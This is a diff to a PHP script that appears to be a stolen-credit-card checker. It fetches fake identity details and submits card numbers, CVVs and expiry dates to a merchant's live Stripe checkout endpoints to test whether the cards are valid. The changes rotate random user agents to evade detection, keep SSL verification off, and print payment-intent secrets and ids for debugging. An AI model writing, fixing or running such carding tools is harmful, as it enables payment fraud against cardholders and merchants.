@@ -4,7 +4,7 @@ require 'function.php';
 
 error_reporting(0);
 set_time_limit(0);
-date_default_timezone_set('Asia/Jakarta');
+// date_default_timezone_set('Asia/Jakarta');
 
 //frist Step 
 function getSID(){
@@ -38,8 +38,8 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
     extract($_GET);
 }
-function GetStr($string, $start, $end) {
-    $str = explode($start, $string);
+function GetStr($str, $start, $end) {
+    $str = explode($start, $str);
     $str = explode($end, $str[1]);  
     return $str[0];
 }
@@ -109,6 +109,7 @@ curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 $resposta = curl_exec($ch);
+curl_close($ch);
 $firstname = value($resposta, '"first":"', '"');
 $lastname = value($resposta, '"last":"', '"');
 $phone = value($resposta, '"phone":"', '"');
@@ -179,6 +180,8 @@ if($state=="Alabama"){ $state="AL";
 
 # -------------------- [CREATE SESSION ID] -------------------#
 $sessionId = getSID();
+// echo $lista.'<br>';
+// echo $sessionId.'<br>';
 
 # -------------------- [1 REQ] -------------------#
 
@@ -208,15 +211,13 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][postal_code]='.$zip.'&guid=7a6b7ade-2de2-4cd4-93ac-19431defb5c93b4558&muid=0d41bab3-09bc-41c9-896b-aa48b89d2ec389148f&sid=8cbb7e96-7cc5-48c2-a87d-4b634e7ceaac194b1f&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604%3B+checkout');
-
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][postal_code]='.$zip.'&guid=85f14e34-2128-4594-9d1e-36cd0e61adf300fbf4&muid=6993b26d-2296-4082-8db1-5cb7348e300869d260&sid=52f9fa49-e9da-4e85-a083-92652e59618110d0e8&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604%3B+checkout');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
+var_dump($result1);
 
 # -------------------- [2 REQ] -------------------#
 
@@ -245,7 +246,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+'user-agent: '.random_ua(),
    ));
 
 # ----------------- [2req Postfields] ---------------------#
@@ -253,17 +254,20 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 curl_setopt($ch, CURLOPT_POSTFIELDS,'eid=NA&payment_method='.$id.'&expected_amount=100&last_displayed_line_item_group_details[subtotal]=100&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI');
 
 $result2 = curl_exec($ch);
-// $id2 = getObj($result2,'payment_intent','id');
 $source = trim(strip_tags(getStr($result2,'"three_d_secure_2_source": "','"')));
-// $client_secret = trim(strip_tags(getStr($result2,'"client_secret": "','"')));
+$client_secret = trim(strip_tags(getStr($result2,'"client_secret": "','"')));
+$id2 = getObj($result2,'payment_intent','id');
 
-echo '<br> source';
+var_dump($result2);
+echo '++++++++++++++++++++++++++++++++++++++++++++++++';
+echo '<br> client_secret => <br>';
+echo $client_secret;
+echo '++++++++++++++++++++++++++++++++++++++++++++++++';
+echo '<br> id2 => <br>';
+echo $id2;
+echo '++++++++++++++++++++++++++++++++++++++++++++++++';
+echo '<br> source => <br>';
 echo $source;
-var_dump($source);
-
-
-
-
 
 die();
 # -------------------- [3 REQ] -------------------#
@@ -293,7 +297,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+'user-agent: '.random_ua(),
    ));
 
 # ----------------- [3req Postfields] ---------------------#
@@ -331,8 +335,8 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
-   ));
+'user-agent: '.random_ua(),
+));
 
 # ----------------- [4req Postfields] ---------------------#
 
